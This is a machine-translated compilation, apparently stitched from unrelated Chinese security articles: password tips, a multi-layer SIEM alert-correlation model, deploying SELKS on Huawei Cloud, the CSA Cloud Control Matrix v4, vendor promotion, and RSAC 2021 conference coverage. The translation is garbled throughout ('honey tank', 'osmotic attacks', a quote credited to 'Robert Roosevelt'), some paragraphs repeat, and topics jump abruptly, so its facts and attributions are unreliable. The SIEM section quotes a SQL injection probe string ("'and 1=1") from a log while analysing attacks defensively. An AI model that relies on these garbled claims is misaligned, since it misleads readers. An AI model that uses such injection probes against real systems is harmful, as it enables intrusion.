You can use a password remembering function like Chrome browser (Chrome had a vulnerability in Chrome low version), or 1password such password management tools to set different complex passwords for different website applications, use such tools for management, you just need to remember the open password of 1 tool.

Recommended on the mobile terminal has the KeePass, AppLock, 1password or the mobile phone to remember the password function, etc.

Set complexity password setting recommended length between 8-12 bits, that is, safe and easy to remember, of course, it is not suitable to use only lowercase letters, numbers, should contain more than two of lowercase letters, numbers, punctuation (or printable special characters).

There are some special techniques to be used, such as symbol transformation, pictographic transformation: 1337 language 1337 language rumor is the legendary hacker language, like the slang of river people, through the transformation of small letters into pictographic numbers or characters, the characteristics of encryption and not easy to be read.

Password generation tools Use online or offline password generation tools online to select options including length, lowercase letters, and printable characters to generate complex enough passwords to save and use.

But similar passwords are often difficult to remember.

Password setting can use the following methods, in combination with the font transformation, to set a password that is both complex, secure and easy to remember.

A favorite sentence finds a secluded but easy to remember phrase or sentence (taken from the song, novel, or movie you like) and then creates its abbreviated form that can contain large and lowercase letters or numbers or punctuation, etc.

From Tang and Song poems, you choose to recite a seven-word poem, using each transformation. The rotation of four sentences can also solve the problem of modifying the password periodically (please choose words and sentences, the examples found on the network have been registered by the social work library, no longer safe).

Common sense theory or knowledge of the common public, but is not often used for password guess, because common sense theory makes the pool of resources wide enough, so it can be well used for password settings.

In the production environment of large enterprises, the processing of security events and the analysis of attack behavior, we need to collect as many security event data of various security devices as possible, such as network firewall, WAF, server protection, VPN, traffic monitoring, APT detection, IDS, IPS, honey tank, etc.

However, excessive security event logs (such as 400,000 logs per day) will not be able to analyze and process manually, and how to filter out real penetration attackers for security operators and responders is a common challenge for all existing SIEM devices.

In a large organization deployed a variety of number of different manufacturer security equipment environment in the following three specific problems: 1, due to the security manufacturer equipment ability problem and log specification problems will be a security device issued a large number of the same attack event the same time or small event interval is a large number of logs, artificial cannot judge whether the same attacker is the repeated behavior of the repeated alarm of security equipment.2, security device vendors alarm the same attack, and SIEM receives similar logs, unable cannot distinguish whether this is an IP or a repeat.
There will be false positives in the equipment of each security manufacturer. Due to the large security equipment scale in the system, the number of log number of false positives is also large, and either the SIEM system or manual analysis cannot filter out these false positives in real time.

Therefore, you cannot filter out the real penetration attack simply through the number of attack logs.

Supported without automated tools, manual filtering event data is basically impossible; the existing SIEM class system solves the normalization problem of multiple heterogeneous data, collect the logs of various security devices and host servers, and standardize the security event logs of different security vendors, as shown in the following figure: After the standardization, alarm the logs with simple associations according to the security business model, and then query analysis and processing in the system.

In the actual deployment environment, this simple association will produce a lot of alarms, resulting in alarm degradation for security incidents, and then it cannot be effectively handled again.

In order to truly realize the generation and processing of effective alarm, a simple correlation model cannot be completed; so imitating the ideas and methods of security operation analysts to solve security problems, adopt multi-layer network timing correlation model and apply multi-layer network technology to infer high-level conclusions as effective warning output, which can substantially improve the warning ability of security events including penetration attack.

We found that in some cases, a security device has been generating a duplicate 5 K alarm log for the same IP, the alarm content is that the IP used a 2013 software vulnerability, in fact the server did not use the software.

If only the quantity statistics are used, a large number of such repeats (false positives) events are found, but this IP is unrelated of the attack.

Multi-layer network timing correlation model can effectively filter out such repeated false alarm events.

Through daily analysis of security logs found that about thousands of IP intranet attacks, such as an extranet IP tried 1 SQL injection into the server, found an alarm in three different manufacturers, after observing the log found that the IP did make 1 injection attempt (using'and 1=1), but no this IP log later, so although this IP has SQL injection, but we cannot alarm this IP to operation and maintenance personnel, because he has no subsequent continuous information investigation and other penetration means.

Implementation envisioned in a big data environment, implementing multi-layer network inference engine will combine complex event processing (Complex Event Processing,CEP) and behavior model recognition engine (Attacking Recognition Modeling Engine,ARME) technology, the former processes real-time event information, provide necessary event aggregation and transformation, etc., the latter realizes complex behavior matching business logic.

The model used in ARME is written in the domain language DSL (D o m a i n in JSON S p e c i f i c L a n g u a g e), which supports complex operations such as value comparison, logic, set operations, time window, and order relationship determination; ARME compiles the model into internal expression, linking processing logic, association, and event triggering.When an external event enters ARME, one or more models that selectively execute the event; roughly, the model execution stage is divided into three stages: logical determination to determine whether the model is eligible to cause subsequent operations; model chain reaction, continue the next model in the model dependency chain; event trigger, whether to output event messages outside the model engine.

In order to deal with repeated log aggregation and effective attack screening problem, MLS-CEP-ARME implements the multi-layer network architecture time window timing processing engine, through the multi-layer network alarm processing model, the specific processing steps: 1 first level processing, log for the same purpose, after a type of log number threshold and start the time window, all the same condition log aggregation into the same event in the time before the window is not closed.

timing aggregation of logs that meet certain attack steps produces first-level timing aggregation events.

Second and third-level processing: The model engine sends the simple aggregate events generated in the previous level as ordinary events to all the model objects of interest in this event. For each model object, the aggregation events and log events are the same class of objects.Second, the tertiary aggregation model continues to cluster behavioral meanings and generate logs and aggregation events with new weak behavioral meaning alarms based on the model.

The fourth level network structure continues to generate high-behavior meaning alarms according to the model sequence and time window, The alarm aggregate not only events at the previous level but also events at any level as the model needs, Ultimately output the penetration attack IP alarm we need to find, As shown in the following figure: the model is a simulation of the penetration test steps and methods, Can be done by security personnel through known experience, It can also be done by performing machine learning on already osmotic attacks, So the multi-layer network timing aggregation model finally finds the log for the same action steps as the penetration tester, If some IP attempts some penetration steps in some time order, Then we determine this IP to be a penetration attack IP, Common false positives or unintentional access to the attempt-triggered security device logs, Or osmotic scans with insufficient intensity, From the quantity, Step sequence, Target characteristics and other above cannot meet the model, That is, the ordinary single POC scan and security equipment misreport at most the first and secondary aggregation events, Because there is no step in the behavior, Even if the number is very large, only a level 1 aggregation does not produce a level 4 alarm.

Actual test effect-warning penetration attack user actual network deployment MLS-CEP-ARME, only 21 day 40W log level 4 alarms, 2,3 events, 2 K level 1 aggregation events, select one of the threat alarm for analysis, you can see the attack I P level 4 alarm use a total of 64 logs: the level 4 alarm by 4 level 3 events, each level 3 aggregation by N more low-level events.

The IP was not blocked.

So we continued to analyze the IP traffic and found that the IP successfully uploaded the file name tett.A word of asp back door, as shown below: you can see that the MLS-CEP-ARME alarm IP is indeed the attacker.

Conclusion, after a period of testing, we found that there was no false alarm of MLS-CEP-ARME, and in fact the I P that triggered the level 4 alarm is very few.

But there is missing report, the security equipment log processing is only in some certain scenarios, but encountered: 1, the attacker using a new vulnerability security equipment cannot alarm 2, other cases penetration tester can successfully penetrate into the system 3, other unknown alarm is very few, the log processing model will not take effect.

A lot of important information is lost because of only secure device logs.

Without defense of depth, SIEM will not give a warning warning once the attacker breaks through the border security device.

Inaccurate alarm type of attack by the security device leads to incorrect alarm identification of the attack identification model.

The next step is to further study how MLS-CEP-ARME and device (non-secure device) logs to detect threats that have successfully entered the Intranet.

We need to deploy the ISO file to the cloud ECS, so here: enter the Huawei Cloud console to its help documentation for local SELKS-6.0-desktop.The iso mirror file is imported into the mirror service IMS private mirror, the operation flow chart is as follows: First upload the iso mirror file to the cloud OBS bucket: then enter the mirror service IMS page from the console, click "Create private image", enter the create private image page, select the I S O mirror file uploaded to the specified OBS bucket.

System configuration reference is as follows, click Create to create a private mirror.

After registering the SELKS iso file as a private mirror of the cloud platform, you can use the mirror to create a new cloud server, or reinstall and replace the system of the existing cloud server, with a recommended base configuration of 2-core CPU + 8GB of memory.

We know that the core of the SELKS system is Suricata,. If we are generally deployed locally, we bypass, using the traffic mirror function of the switch to import business traffic into Suricata, and then make threat alarm according to its rules.

If cloud business traffic cannot be imported into Suricata, the core alarm function that SELKS relies on Suricata alarm rules is basically disabled.

After constantly searching for related solutions, I finally, found a big bull open source project Netis Packet Agent. in Github

Netis Packet Agent is an open source project to solve the data package captured on device A and then use analysis on device B.

In many cases, when you want to monitor traffic on your network, but there are no available devices available, such as no TAP and SPAN devices in a physical environment.

In Virtual Switch Flow Table, SPAN functionality does not support in virtual environments.

Therefore, the project provides a set of low-cost but high-performance package grasping tools to meet the above difficulties.

pktminerg was the first tool to release.
The tool can easily grasp packets on the network card, encapsulated with GRE head to the remote device for packet monitoring and analysis.

The Cloud Control Matrix v4》 (C C M v 4) medium-UK version released by the CSA International Cloud Security Alliance includes 197 control targets out of 17 control domains, fully covering the security field of cloud computing technology.

It can be used as a systematic evaluation tool for the implementation of cloud computing, or as a guide for the role and security control relationship in the cloud computing supply chain.

Cloud Control Matrix v4 has greatly updated v3.0.1 to cover the requirements from new cloud computing technologies, new controls, and security responsibility matrix, improve the accountability of control items, and enhance interoperability and compatibility with other standards.

The 17 control domains of the cloud control matrix are: audit and security; application and interface security; business continuity management and operational resilience; change control and configuration management; cryptography, encryption and key management; data center security; data security and privacy lifecycle management; governance, risk management and compliance; human resources; identity and access management; interoperability and portability; infrastructure and virtualization security; logging; security and monitoring; security event management, electronic discovery and cloud proof; supply chain management, transparency and accountability; threat and vulnerability management; unified terminal management.

With its professional knowledge and reputation in the field of information security and accumulated in the field of cloud computing, it was invited to participate in the writing of Cloud Control Matrix v4, and is also the third published work to participate in the writing of the alliance.

Since its inception in 2018, it has been taking "making the smart world safer and escorting digital" as its primary mission.

With continuous research and development and innovation, it has independently developed patented intelligent zero-trust network security products with independent intellectual property rights, and appeared as a number of authoritative reports, and grown into a leading zero-trust network security manufacturer in China.

An Tiantian intelligent zero-trust network security products can help enterprises to easily upgrade to the next generation of network architecture in the digital era, rebuild trust and software-defined boundaries for enterprises, and solve the pain points of enterprises such as information leakage, IT privileges and network attack.

By combining cutting-edge technology technology, to ensure the safety of enterprise core data and business, to realize the adaptive security and complete P2DR security model, to respond to the new challenges in the new infrastructure era.

Shanghai Anqi Technology Co., Ltd. (hereinafter referred to as Anqi Network Security), with its cutting-edge security technology strength and innovative practice in finance, manufacturing, technology, medicine and other industries, was successfully selected into 14 security segments and fields in the map.

It is understood that the research of this map involves a total of 53 security segments in 15 security industry direction, with a total of 1,941 data items, and nearly 400 network security-related enterprises and institutions have participated in the research.

In the future, Anqi Network Security will forge ahead, ride the momentum, and constantly "make the intelligent world safer and escort the digital" with high-quality technology.

Since its establishment, with continuous research and development and innovation, it has independently developed patented intelligent zero-trust network security products with independent intellectual property rights, and has appeared as a representative manufacturer in many industry reports, growing into a leading zero-trust network security manufacturer in China.

In the digital era, An Tiantian domain intelligent zero-trust network security products help enterprises to easily upgrade to the next-generation of network architecture, rebuild trust and software-defined boundaries for enterprises, and solve long-term pain points such as information leakage, IT privileges and network attacks.

By combining cutting-edge technology technology, to ensure the safety of enterprise core data and business, to realize the adaptive security and complete P2DR security model, to respond to the new challenges in the new infrastructure era.

This RSA conference is different from the past, using the form of network virtual conference on the whole line, around the theme of this conference ——Resilience(elasticity) to share a series of new ideas, new methods, new technologies full of dry goods.

The theme of the RSA conference is "elasticity": "elasticity" has different meanings in different fields, but the constant nature is the ability to adapt flexibly.

From the perspective of confrontation and competition in human real and virtual societies, it is the ability to predict, resist, recover, and adapt to adverse conditions, stress, attack, or destruction.

In the face of the constantly complex cyberspace situation, constantly changing cyber security trends, and constantly harsh forms of cyber security, we must be more flexible and constantly evolving to adapt to the constantly coming challenges.

Meeting time: May 17 solstice May 20 meeting content includes: keynote speech, sandbox innovation competition, a variety of theme seminars, digital expo and other forms.

Here, FreeBuf will live broadcast the conference to bring you the first-line live information.

Without going abroad, you can also harvest the views of various cattle, learn the latest methods and technologies, and master the latest trend of network security.

Wendy Nather, Director of CISO Consulting at Cisco, worked with partner and co-founder and Professor Wade Baker at the Cyentia Institute and Virginia Tech, to conduct a survey and research related to Cisco's 2021 security outcomes.

Nathe said the report examines 25 different common security practices that can eventually be divided into three categories: business and governance, strategy and spending, and architecture and operations.

The keynote will decrypt the latest attacks in the current global threat pattern, conduct in-depth discussions of specific, real-time cases with national context and attacker activities in criminal groups, and provide strategic advice to respond to these attacks.

Software integrity includes supply chain security for all the embedded libraries and components that make up modern applications.

Heather Mahalik, director of digital intelligence at the SANS Institute, sees improper sessions as the biggest risk.

Johannes Ullrich, research director of the SANS Technology Institute, warned that AI and machine learning used for malicious purposes is a potential risk.

Ullrich says an attacker can influence or manipulate machine learning training datasets, which will affect the action that AI systems will take.

Katie Nickels, a certified lecturer and the director of intelligence at the SANS Institute, warned that while ransomware is not a new threat, in fact 2021 is creating new risks.

Corman said: " The reliability of software, or the lack of reliability, is now a primary consideration for everyone."Having a supervisor responsible for product safety is an important step to help improve safety.

Wysopal explains that CSO or CISO is often related to overall organization security, compliance, and corporate brand protection.

In Wysopal's view, the software being developed today is actually increasing more risk to the whole world, and there is a clear need for steps to reduce that risk.

Very Good Security, chief information officer of mining cryptocurrencies, said cryptocurrencies have two major sources of risk, namely miners and cryptohijacking.

One risk is the potential for miners to abuse the free resources provided by cloud services and application service providers on the Internet, creating many free accounts on the cloud infrastructure and gaining a lot of computing power at the expense of service providers.

Kathy Wang says it violates the terms of service to detect encrypted mining activity by analyzing DNS traffic or detecting network packets.

Another risk is the cryptographic hijacking.

It is possible for miners to use and use the information they have to attack and destroy.

One of the ways to perform encryption hijacking is to use malware, such as WannaMine, malicious sites that somehow trick users into installing the software.

One way for users to protect their encrypted wallet accounts from the risk of taking over, Kathy Wang says, is zero trust.

In the case of zero trust, the access limit is the minimum permission.

Also, enabling dual authentication can also help enhance secure access.

Data Contact Tracking Technology is critical SolarWinds Supply chain attack events remind us that the ability to track all contacts with sensitive data is critical.

Digitally, contact tracing is an epidemiologically-like technology that can be a powerful security tool.

Splunk CEO Doug Merritt shared at the conference how data contact tracing can help detect vulnerabilities earlier and remedy them more effectively.

Hacking Exposure: The New Generation Tactical, Technology, and Program Keynote highlights the latest trends in the current new generation of tactics, technologies, and programs for cyber attackers, covering the increasing complexity of ransomware, and live demonstrations of some attack technologies.

Ensure that the transformation of network security of "boundless" enterprises has arrived, both business and enterprises are transforming to the cloud, and enterprises are no longer limited by the traditional network infrastructure.

Forcepoint CEO Manny Rivelo said that we should gain insight into the current "borderless" businesses and businesses, push control to users, and understand the boundaries and prosperity of different ecosystems.

SolarWinds CEO responded for the first time that SolarWinds CEO Sudhakar Ramakrishna first released details of the SloarWinds supply chain attack at RSAC 2021, and regretted the previous "dumped" intern leaked passwords in Congress.

I said, " I've long been following the idea of never' flogging 'losers and I want employees, interns to learn from mistakes after making mistakes... so it's inappropriate or inappropriate to blame an intern in congressional hearings.”

Conference Day 2 Risk Decisions Based on Science Not Headlines(measures risk through data, not headlines) McAfee Senior Vice President and Chief Technology Officer Steve Grobman shared "Measure Risk through Data, not headlines" at the conference.

Grobman says that many of our views of cyber risks are wrong and require a scientific way to measure risk and help resist bias.

The security industry is often caught into the "panic" created by the media, sensing risk through its description of the threat."Companies worry about various threats.

We see massive malware almost every hour, and daily harpoon fishing attacks against key employees.

There are also large, devastating, state-oriented attacks."Grobman noted," the observation is that the frequency of an event is inversely proportional to its effect."There are multiple levels of nuances in the impact of a network event.

We need to jump out of the global impact and consider the impact of events on businesses.

Grobman recommends that a risk model covering all factors consider three important factors, influence, size and frequency.

Solving the Ransomware Scourge Requires a Coordinated Effort(requires multiple collaboration to solve ransomware issues) Jen Miller Osborne (Jen Miller-Osborn, deputy director of Palo Alto Networks's Threat Intelligence Department), said that from 2019 to 2020, average ransom payments almost tripled to $312,493 from $115,123.

During the same period, the highest ransom amount doubled from $5 million to $10 million.

Members of the Security Technology Institute and the ransomware Task Force agreed that responding to ransomware requires coordinated and comprehensive efforts across the public and private sectors.

Michael Daniel (president and CEO of the CyberThreat Alliance (Cyber Threat Alliance), said ransomware has changed over the last decade.

The impact of ransomware is not limited to any industry, or even within any U. S. government.

Daniel said it was necessary for the federal government to improve the capabilities of multiple agencies, not just that enhanced ability to withstand extortion.

Miller Osborne has argued for more law enforcement action to deter potential ransomware actors."Cybercrime will never disappear.

But the more we guard against potential attackers, the safer people are."Cybersecurity as a National Imperative(cybersecurity is a national priority) Anne Newberg (Anne Neuberger), deputy national security adviser for US networking and emerging technologies, elaborated the Biden administration's cyber security policies, including ways to modernizing cyber security and cyber security defense, enabling the United States to respond to threats from all parties.

Specific content can be jumped to the FreeBuf RASC 2021 feature report to watch.

Safeguarding Privacy with Purpose and Passion(uses purpose and passion to protect privacy) Vasu Jakkal, vice president of Microsoft security compliance and identity CVP, said the past decade saw privacy innovation grow too fast to keep up.

Vasu Jakkal believes that it is a common responsibility to protect privacy for all, to lead, build trust and create lasting business value through comprehensive privacy and security practices.

Reshaping Security to Power Business Growth(Remodel security to drive business growth) Mary O\'Brien, IBM Security Manager and Dow Chemical CISO Mauricio Guerra, discuss turning zero trust into a reality to manage security and boost business.

The conference opens with "The Elastic Journey," shared by RSA CEO Rohit Ghai."A global epidemic, unprecedented cyber attacks, and relentless challenges have hit us, but cyber security has withstood the test.

Cybersecurity is an industry built on resilience, a flexible, innovative and developing industry.

So 2020 tested us, but it didn't beat us down.

However, the next test is about to follow, so, let us hold our strengths, share what we have learned, expand our community, and continue to protect what is most important."

Chuck Robbins, chairman and CEO of CISCO, shared how cybersecurity provides an inclusive future for all."The world has changed dramatically over the past year, and as we adapt to a brand new, hybrid world, every organization in every industry has focused on maintaining its resilient business while facing more complex challenges than ever in the past.

Chuck Robbins believes the focus on end-to-end security is key to addressing challenges and shares a fundamental approach to truly guide cybersecurity to an inclusive future for all."

The teams are more engaged, effective and resilient when they feel able to influence change.

Angela Weinman, Head of Global Governance, Risk, and Compliance at VMware, and Netflix DVD Corporate Information Security Division Jimmy Sanders share why and how they believe that telling the truth can affect change."

Dr. Zulfikar Ramzan, Assistant Chief Digital Officer, Professor of Computer Science Adi Shamir, EPFL, Weizmann Institute, Professor Ronald Rivest, Massachusetts Institute of Technology, and cryptographer and security expert Whitfield Diffie are a panel of cryptography experts participating in the RSA conference.

Fortalice Solutions CEO and President Theresa Payton addresses the impact of cybersecurity events on "the election"."This keynote will reveal how cyberwarfare that spreads misleading information and manipulate all kinds of movements takes place.

These actions attempt to shake public opinion or even the elections.

Participants will learn how to discover and block different technologies that make and spread misinformation, and how to help tech giants, government organizations, and others who believe in and spread misinformation."

Hacking is often considered as attacks made against computer systems.

The idea can be extended to any rule system: tax laws, financial markets, and any legal system can be hacked.

Better imagine when AI can become the world of hackers- -the hackers of our social, economic and political systems are found to originate from the computer system itself.

Therefore, people's rapid response methods must change.The RSA conference is a series of IT security conferences.

About tens of thousands of people attend each year, and its main event is the annual security conference in San Francisco.

The RSA conference began in 1991 as a small crypto conference themed "cryptography, standards and public policy" forum for cryptographers to gather and share the latest knowledge and advances in the field of Internet security.

From 1995, the RSA convention set a refined theme every year.

These themes partly reflect the global security markets.

In February, Sudhakar Ramakrishna appeared with his former CEO Kevin Thompson, at a joint hearing before the House Oversight and Homeland Security Committee (House Oversight and Homeland Securities committees).

At the meeting, Kevin Thompson blamed the interns for the "solarwinds123" password breach.

The two accused the password problem of "a mistake by an intern," saying " he violated our password policy by posting the password internally, on his private Github account."Sudhakar Ramakrishna regretted making the speech at the RSAC conference.

I said, " I've long been following the idea of never' flogging 'losers and I want employees, interns to learn from mistakes after making mistakes... so it's inappropriate or inappropriate to blame an intern in congressional hearings."He also revealed that the attackers may have entered the company system as early as January 2019.

I was having my birthday dinner on December 12,2020, receiving a call from company legal staff and was told of the attack.

He had not officially assumed SolarWinds CEO at the time.

Laura Koetzle, Forrester vice president and Group director, asked the Sudhakar Ramakrishna, if he was considering giving up at the time?He replied that many friends at the time advised him to give up, but after communicating with Chairman Bill Bock, he decided to insist; he also received support from his former CEO Kevin Thompson.

Sudhakar Ramakrishna also said the company has developed Orion Assistant projects along with global partners to provide additional support to customers who don't have the resources to upgrade or rebuild.

He added that his previous experience as CEO at Pulse Secure helped him cope with the aftermath of the SolarWinds attack.

Ed Skoudis, a researcher and director of the SANS Institute, noted that disrupting software integrity is one of the biggest attack carriers he sees today.

Software integrity includes supply chain security for all the embedded libraries and components that make up modern applications.

Skoudis says our software development and distribution process today focuses on speed and pursues a faster introduction of new code and features.

Developers don't focus on reliability and security, and this is a pretty serious problem.

In response, Skoudis also said that there is no single solution to software integrity and software supply chain management problems, and that companies need to make plans based on their own situation.

The first thing to do is for organizations to know what software is in their environment so that they can defend against it.

The next step is to have a list of software materials that basically identifies all the components constituting a particular set of software applications.

Skoudis also recommends that businesses also incorporate threat hunting into their workflow to help find potential risks.

Heather Mahalik, Director of Digital Intelligence at the SANS Institute, sees session mishandling as the biggest risk.

Mahalik warns that each time a user logs in to an application or service, some form of access token is granted to allow access to the session.

But some sessions don't protect the tokens well, so the data can be leaked or abused.

However, some simple steps can reduce the risk of session handling.

The most concise and effective measure Mahalik suggests is that users exit the device and application session after work.

Mahalik says most users now like to keep their screen open, their devices available, and to check free sign-in for the next seven days, but it's actually unsafe.

And she also encourages developers to make deadline-limited tokens to "kick" users out of the network.

Johannes Ullrich, director of the SANS Technology Institute, has warned that AI and machine learning used for malicious purposes is a potential risk.

Ullrich warns that attackers can influence or manipulate machine learning training datasets, which will affect the action that AI systems will take.

User training data is important and we need to understand these models.

Understand what they're doing, and know how to adjust them.

Rransomware is More than Just a Question of Availability Katie Nickels, certified lecturer and director of intelligence at the SANS Institute, said while ransomware is not a new threat, in fact 2021 ransomware is creating new risks.

She noted that ransomware has historically been discussed as a matter of availability, namely, after the data is encrypted by the attacker, and that users are unable to continue to access and use the data.

In her opinion, ransomware is no longer just an availability issue, it begins to be associated with data breaches.

Nickels explained that the attackers will now steal the data and then use it for different purposes before encrypting it and demanding a ransom."In fact, in the fourth quarter of 2020, we found more than 70% of ransomware cases involving some kind of leakage and extortion," and, Nickels also said that this dangerous new attack would become the new normal.

Thereafter, we need to consider not only the availability of the data, but also its confidentiality, and realize that the attacker is very likely to steal and export our data.

Since ransomware is more than just an availability issue, advice on how organizations protect themselves shifts.

Nickels said that just having an offline backup is not enough, and that businesses should also take precautions, such as banning any non-essential file-sharing tools.

Facing the pressure of the pandemic and the seemingly endless cybersecurity threat, Nickels offers an encouraging advice.

She noted that former U. S. President Robert Roosevelt once said, "Use what you can do and do what you have."

In her opinion, the advice applies equally to IT security professionals."You may not be able to solve every challenge, but don't be crushed and try to start over somewhere.

Like start by improving your detection capabilities, no matter how much that can actually contribute to your organization."Nickels said," Do what you have and where you can, both if you have in cybersecurity and where you are in life.

Apiiro, a security development lifecycle management company named "the most innovative startup," the company's product code risk visualization management platform, is favored by the judges.

The platform provides a full range of security risk management across applications, infrastructure, open-source code, developer experience, and business impact.

As a code risk visualization management platform, Code Risk Platform provides risk visualization information for every link of design, code, cloud and so on.

The company was selected as RSAC's most innovative startup, in part because it is a mature product that addresses the problem the cybersecurity industry has faced for years: how to quickly identify key information from the code repository with the growing number of enterprise code.

Founder Idan Plotnik and Yonatan Eldar are both veterans of the Israeli Department of Defense, with 20 and 16 years of experience in cybersecurity and software development, respectively.

They have previously been responsible for the risk management of large software at Microsoft.

Linda Gray Martin, vice president of R S A C at Apiiro CEO and vice president, said, " The companies participating in the innovative sandbox competition this year have proved their ability to adapt, and they have made unremitting efforts to prevent the increasing threats facing companies."

According to public information, this year marks the 16th year of the RSAC Innovation Sandbox Competition, a platform for security industry startups to display cutting-edge technologies that have the potential to change the entire industry.

Since the competition, the top 10 companies have undergone more than 50 acquisitions and received more than $8.2 billion.

Awards in previous terms include Imperva, Phantom, Axonius, securitia.ai 。

This year, TOP 10 innovation network security enterprises cover security technology field: data security 3, identity and access security 2, software supply chain security 2, cloud security 1, mail security 1.

Of them, seven companies are headquartered in the United States, and three companies are headquartered in Israel.

Supported by one-click A P I integration with Microsoft 365 and Google Workspace, the Abnormal platform uniquely utilizes behavioral data science approaches for analysis and baseline determination to detect abnormal and compromised accounts.

The Abnormal AI threat detection engine to model the identities of employees and external senders, create relationships, and analyze e-mail content can effectively prevent targeted social engineering attacks.

Apiiro analyzes data throughout the development process to help companies identify, prioritize, and remedy development process risks.

Apiiro provides businesses with a 360-degree security and compliance risk view, from design to production, across applications, infrastructure, developer knowledge, and business impact.

The platform patented technology allows organizations to discover and block attacks similar to SolarWinds supply chain attacks, first preventing build-time code injection, a key factor in the SolarWinds vulnerability.

The second is the ability to detect abnormal behavior in the developer's identity to identify damaged accounts and internal threats.

The solution provides a new agent-free model that securely connects users on any device to enterprise business applications anywhere, without exposure to the network or the application itself.

App Access Cloud does not need to change the existing network architecture and is inherently more secure, because its unique application isolation technology separates users from corporate networks and separates applications from internal networks and Internet.

App Access Cloud can significantly reduce the impact of growing network threats, such as threats posed by recent SolarWinds and Microsoft mail server vulnerabilities.

The platform can realize data "available and invisible" to effectively protect data privacy and compliance, enabling external data sources to safely send encrypted data between multiple parties, which Cape can process without decrypting decryption.

Subsequently using the rich model output is decrypted and used by the users of Cape.

Cape's technology has been successful in the financial industry and will be used in the life sciences and government in the future.

Core Advantage: Deduce protects businesses and its customers from unauthorized account access, data breach, and identity fraud.

It is the first company to combine identification with leading cybersecurity technology to serve almost all sizes in a practical and economical way, whose platform follows global data privacy rules (including GDPR and CCPA) and maintains more than 200 million U. S. profiles available to determine whether users are their claimed online identities.

Deduce launches an identity network to help companies of any size can protect customers' accounts, reduce the risk of fraud and potential regulatory fines, while improving customer satisfaction and brand value.

Data is the lifeblood of modern enterprise development, but many times, security and cloud infrastructure teams don't have the right tools to keep up with their data explosion.

Questions include, " Where are our data?"," What type of data do we have?"and" Are the data correctly protected?” 。

Open Raven eliminates blind spots by completely mapping cloud assets using Serverless features and native API, supporting PB-level data classification, and enabling policy-based monitoring of existing workflows.

The Satori Secure Data Access Cloud (SecurityDataAccessCloud) provides monitoring and managing data use and data access in the cloud.

Many organizations face challenges in identifying sensitive data, monitoring data use as well as executing security, privacy, and compliance policies.

Satori's platform addresses these challenges by integrating, automated, and scalable solutions.

Satori can enforce regulations such as GDPR and CCPA, meet compliance requirements for data access audit and control such as SOC2 and HIPAA, and provide full visibility and control for sensitive data use in enterprise data storage.

Companies are increasingly using a variety of cloud services today.

In these distributed environments, identity and security policies cannot be centrally managed across each cloud platform because each cloud platform uses independent, built-in identity systems, and Strata connects and unifies multiple cloud identity systems by building a distributed identity structure (Identity Fabric), including old local identity systems, so they can be managed as a whole.

The company's founders co-authored the SAML Open Standards for Identity Interoperability, creating the first cloud identity service, delivering the first open-source identity product, and are now building the first distributed identity platform.

Wabbi's SecDevOps infrastructure platform can securely deploy, automate, and orchestrate security applications throughout the SDLC.

By integrating into an existing DevOps workflow, the development team no longer needs to make a trade-off between speed, agility, or security.

With centralized security governance, development teams can manage business application security locally to easily deploy relevant tools and processes.

It designed the first cloud visibility solution for enterprise security teams that analyzes entire cloud environment security risks, providing 360-degree security risks across clouds, containers, and workloads.

Providing actionable, graphical analysis, and completely agent-free patterns to discover risks, Wiz can scan customer cloud paths in less than a day, while other vendors take 12 to 18 months for vendors to rely on agents to track activity.

Newberg first described the current situation of the increasingly dangerous cyber threat, noting that Biden had to deal with two mass cybersecurity incidents, the ——SolarWinds attacks and Microsoft Exchange attacks, within 100 days in office.

"Governments and businesses are being subjected to constant, complex and malicious attacks from all kinds of cybercriminals."

Today, cybersecurity is more necessary than ever before to be included as part of national security."Newberg said that in the current environment, the way of thinking should be changed from emergency response to prevention.

She believes that while an attack is bound to happen and we need to be prepared for it, we cannot let the wait for an attack become the status quo of operation.

Based on this view, Newberg lists three areas that the current Biden administration focuses on strengthening national cyber security.

Network defense modernization emerges from the SolarWinds attacks that, " Some of the most basic cybersecurity measures have not been systematically extended among federal agencies."These measures include: multivariate authentication, encryption, and endpoint detection.

In addition to the government enforcing these basic security safeguards, Newberg said the government is taking steps to ensure that the security of the software it buys from suppliers is qualified because the government buys products "often with flaws and vulnerabilities."

Currently, these suppliers either patch them afterwards or directly ignore vulnerabilities they consider not serious.

But Newberg argues that these remedies are inappropriate, in deliberately introducing unknown, potential risks that would be exploited by opponents and criminals.

To address this issue, Newberg said the government's top priority is to ensure that the software it purchased is being built safely from the start, which "may require vendors to build software where there is a secure development environment available."

She added that this approach should bring in more chain effects, such as strengthening software security for schools and small businesses outside the government.

In addition, the government is clear which software is developed safely and which is unsafe, because it is currently impossible for customers to make such assessments.

She also stressed that the government is currently developing a pilot program to protect the technologies relied on in the country's key infrastructure.

This plan " will drive the efficient installation of new technologies in the private sector to provide timely visibility, detection, response, and blocking capabilities."And this is just the first step in ensuring the security of key infrastructure systems.

Playing a more active role in international cyberspace, Newberg stressed that the US needs to strengthen its global partnership "against rivals that use technology to undermine national and global security."

Regarding this, she highlighted initiatives such as the Quartet Security Dialogue Conference (QUAD) that aims to "respond to cyber threats and hold malicious actors accountable for it."

She revealed that one of the government's first global cybersecurity initiatives would be "working together to fight ransomware," which is becoming more common.

She noted that " It is a national security threat to countries around the world because it can disrupt the services provided by schools, hospitals, governments, and businesses.And there will be huge economic costs, too."

Newberg added that the danger of ransomware is that its attackers are often able to attack against known vulnerabilities, such as terminal and software vulnerabilities.

Moreover, it cannot be ignored that ransomware gangs have increasingly complex technologies, such as the use of filesless malware, and more mature operations, such as the growth of double ransomware programs.

Newberg believes that " international cooperation will be crucial to tackle ransomware.Because ransomware criminals tend to be transnational criminals who use global infrastructure and money laundering networks to commit crimes."In addition to the above technological advancement and infrastructure protection, the Biden administration's other priority is" investing in and promoting innovation tomorrow."

As a result, the government's "American Employment Plan" proposes to invest $180 billion to develop emerging technologies.

This covers the areas of artificial intelligence, quantum computing, and microelectronics.

Newberg said the investment is crucial to strengthening U. S. cyber defense.

She specifically emphasized the future importance of quantum computing in this regard.

While the technology "will hopefully revolutionize certain unsolved computing problems," it will also " fundamentally disrupt the technology platform for cybersecurity and its survival."This is because quantum computing provides attackers with new carriers to disrupt IT systems, with potentially" disruptive "effects on certain encryption methods, such as isometric encryption, which is" the basis of our economic and national communications security."

Thus, the American Employment Program reflects the government's commitment to accelerate American leadership in quantum computing and broader quantum information science that would help "protect the nation from these technologies used by enemies".

At the end of his speech, Newberg said: " Strengthening national cyber security, ensuring the key national infrastructure and widely updating the advantages of the United States are fundamental to the Biden administration's strategic commitment to national security."

The intersection of disorder and Rsilience Ghai commented that "disorder" (chaos) describes cybersecurity patterns.

